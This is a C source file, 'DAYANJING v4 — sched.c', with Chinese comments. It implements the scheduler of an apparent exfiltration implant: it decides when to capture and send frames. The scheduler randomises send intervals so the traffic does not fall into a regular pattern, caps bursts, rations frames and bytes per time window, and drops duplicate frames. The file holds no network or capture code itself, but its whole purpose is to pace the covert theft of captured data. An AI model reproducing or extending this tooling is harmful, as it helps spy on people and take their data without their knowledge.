/*
 * DAYANJING v4 — sched.c
 *
 * 采集调度层实现。决策与执行分离：本文件只回答"该不该采 / 该不该发"，
 * 不采集、不加密、不发包。
 *
 * 时间全部由调用方注入（now_us），因此窗口滑动、配额恢复、突发上限
 * 都可以在测试里把时间直接推进到任意点验证，不需要 sleep。
 */

#include "exfil_sched.h"

#include <string.h>

/* ------------------------------------------------------------------ */
/* 可复现随机源                                                        */
/* ------------------------------------------------------------------ */
/*
 * xorshift64。不用 rand()：rand() 的状态是进程全局的，会被其它代码
 * 推进，导致同 seed 不同序列，抖动范围无法断言。
 * 状态为 0 时本函数恒返回 0（全零不动点），故 init 强制 seed != 0。
 */
static uint64_t rng_next(uint64_t *st)
{
    uint64_t x = *st;
    x ^= x << 13;
    x ^= x >> 7;
    x ^= x << 17;
    *st = x;
    return x;
}

/* ------------------------------------------------------------------ */
/* 配置                                                                */
/* ------------------------------------------------------------------ */

void exfil_sched_default_cfg(exfil_sched_cfg_t *cfg)
{
    if (!cfg) return;
    cfg->min_interval_us   = 1000000;      /* 1s */
    cfg->max_interval_us   = 2000000;      /* 2s —— 抖动到 2 倍，避免等间隔 */
    cfg->burst_max         = 32;           /* 一次连续采集最多 32 帧 */
    cfg->window_us         = 10000000;     /* 10s 配额窗口 */
    cfg->window_max_frames = 8;
    cfg->window_max_bytes  = 8u * 1024u * 1024u;
    cfg->dedup             = 1;
}

int exfil_sched_init(exfil_sched_t *s, const exfil_sched_cfg_t *cfg,
                     uint64_t seed)
{
    if (!s) return EXF_SCHED_ERR_ARG;
    if (seed == 0) return EXF_SCHED_ERR_ARG;   /* xorshift 全零不动点 */

    memset(s, 0, sizeof(*s));

    if (cfg) {
        s->cfg = *cfg;
    } else {
        exfil_sched_default_cfg(&s->cfg);
    }

    /* 配置合法性 */
    if (s->cfg.max_interval_us < s->cfg.min_interval_us)
        return EXF_SCHED_ERR_CFG;
    /*
     * window_us == 0 表示"不设窗口"。此时若配额非零，窗口永远不会滑动，
     * 配额耗尽后再也无法恢复 —— 调度器永久卡死。必须拒绝。
     */
    if (s->cfg.window_us == 0 &&
        (s->cfg.window_max_frames != 0 || s->cfg.window_max_bytes != 0))
        return EXF_SCHED_ERR_CFG;

    s->mode       = EXF_SCHED_MODE_IDLE;
    s->rng_state  = seed;
    /*
     * next_due 初始为 0 —— 意味着一旦 start，第一次 poll 立即 DUE。
     * 这是有意的：触发后应马上采一帧，而不是先空等一个间隔。
     */
    s->next_due_us = 0;
    return EXF_SCHED_OK;
}

void exfil_sched_wipe(exfil_sched_t *s)
{
    if (!s) return;
    memset(s, 0, sizeof(*s));
}

/* ------------------------------------------------------------------ */
/* 触发                                                                */
/* ------------------------------------------------------------------ */

int exfil_sched_start(exfil_sched_t *s)
{
    if (!s) return EXF_SCHED_ERR_ARG;
    s->mode        = EXF_SCHED_MODE_CONTINUOUS;
    s->frames_sent = 0;
    return EXF_SCHED_OK;
}

int exfil_sched_once(exfil_sched_t *s)
{
    if (!s) return EXF_SCHED_ERR_ARG;
    s->mode        = EXF_SCHED_MODE_ONCE;
    s->frames_sent = 0;
    return EXF_SCHED_OK;
}

void exfil_sched_stop(exfil_sched_t *s)
{
    if (!s) return;
    s->mode = EXF_SCHED_MODE_IDLE;
    /*
     * 有意不清空窗口配额：STOP 后立即 START 不应获得一份全新配额，
     * 否则反复 stop/start 就能绕过限速。
     */
}

/* ------------------------------------------------------------------ */
/* 配额窗口                                                            */
/* ------------------------------------------------------------------ */

/*
 * 按整窗口推进起点，而不是把起点设为 now。
 * 若设为 now，长时间空闲后每次 poll 都把起点推到当前，配额会被无限
 * "续期"攒起来，最终一次性爆发 —— 与限速的初衷相反。
 */
static void slide_window(exfil_sched_t *s, uint64_t now_us)
{
    uint64_t elapsed;
    uint64_t n;

    if (s->cfg.window_us == 0) return;      /* 无窗口配置 */
    if (now_us < s->window_start_us) return;
    elapsed = now_us - s->window_start_us;
    if (elapsed < s->cfg.window_us) return;

    n = elapsed / s->cfg.window_us;
    s->window_start_us += n * s->cfg.window_us;
    s->window_frames    = 0;
    s->window_bytes     = 0;
}

/* ------------------------------------------------------------------ */
/* 决策                                                                */
/* ------------------------------------------------------------------ */

int exfil_sched_poll(exfil_sched_t *s, uint64_t now_us)
{
    if (!s) return EXF_SCHED_ERR_ARG;

    if (s->mode == EXF_SCHED_MODE_IDLE)
        return EXF_SCHED_IDLE;

    slide_window(s, now_us);

    /* 突发上限：到达即自动停止，防止忘记 STOP 造成无限采集 */
    if (s->mode == EXF_SCHED_MODE_CONTINUOUS &&
        s->cfg.burst_max != 0 &&
        s->frames_sent >= s->cfg.burst_max) {
        s->mode = EXF_SCHED_MODE_IDLE;
        return EXF_SCHED_IDLE;
    }

    /* 窗口配额 */
    if (s->cfg.window_max_frames != 0 &&
        s->window_frames >= s->cfg.window_max_frames)
        return EXF_SCHED_WAIT;
    if (s->cfg.window_max_bytes != 0 &&
        s->window_bytes >= s->cfg.window_max_bytes)
        return EXF_SCHED_WAIT;

    /* 时间间隔 */
    if (now_us < s->next_due_us)
        return EXF_SCHED_WAIT;

    return EXF_SCHED_DUE;
}

int exfil_sched_commit(exfil_sched_t *s, uint64_t now_us,
                       uint32_t crc, size_t len)
{
    uint64_t span;
    uint64_t jitter = 0;
    int      dup;

    if (!s) return EXF_SCHED_ERR_ARG;

    /* 先算下一次到期时刻：无论是否发送都必须推进，否则会忙循环空转 */
    span = s->cfg.max_interval_us - s->cfg.min_interval_us;
    if (span > 0)
        jitter = rng_next(&s->rng_state) % (span + 1);
    s->next_due_us  = now_us + s->cfg.min_interval_us + jitter;
    s->last_send_us = now_us;

    /*
     * 去重判定：CRC32 + 长度。逐字节比较需保留上一帧全部内容
     * （上限 16MiB），内存代价不可接受。
     */
    dup = (s->cfg.dedup && s->has_last &&
           s->last_crc == crc && s->last_len == len);

    if (dup) {
        /* 跳过的帧不消耗 burst 与窗口配额 —— 它没占用带宽 */
        return EXF_SCHED_SKIP;
    }

    /* 首帧没有可比指纹，必须发送 */
    s->has_last   = 1;
    s->last_crc   = crc;
    s->last_len   = len;

    s->frames_sent++;
    s->window_frames++;
    s->window_bytes += (uint64_t)len;

    if (s->mode == EXF_SCHED_MODE_ONCE)
        s->mode = EXF_SCHED_MODE_IDLE;

    return EXF_SCHED_OK;
}

uint64_t exfil_sched_wait_us(const exfil_sched_t *s, uint64_t now_us)
{
    if (!s) return 0;
    if (now_us >= s->next_due_us) return 0;
    return s->next_due_us - now_us;
}

void exfil_sched_usage(const exfil_sched_t *s,
                       uint32_t *frames, uint64_t *bytes)
{
    if (!s) return;
    if (frames) *frames = s->window_frames;
    if (bytes)  *bytes  = s->window_bytes;
}

const char *exfil_sched_errstr(int e)
{
    switch (e) {
    case EXF_SCHED_OK:      return "ok: should send";
    case EXF_SCHED_DUE:     return "due: capture now";
    case EXF_SCHED_WAIT:    return "wait: interval or quota";
    case EXF_SCHED_IDLE:    return "idle: not running";
    case EXF_SCHED_SKIP:    return "skip: duplicate of previous frame";
    case EXF_SCHED_ERR_ARG: return "invalid argument";
    case EXF_SCHED_ERR_CFG: return "invalid configuration";
    default:                return "unknown";
    }
}
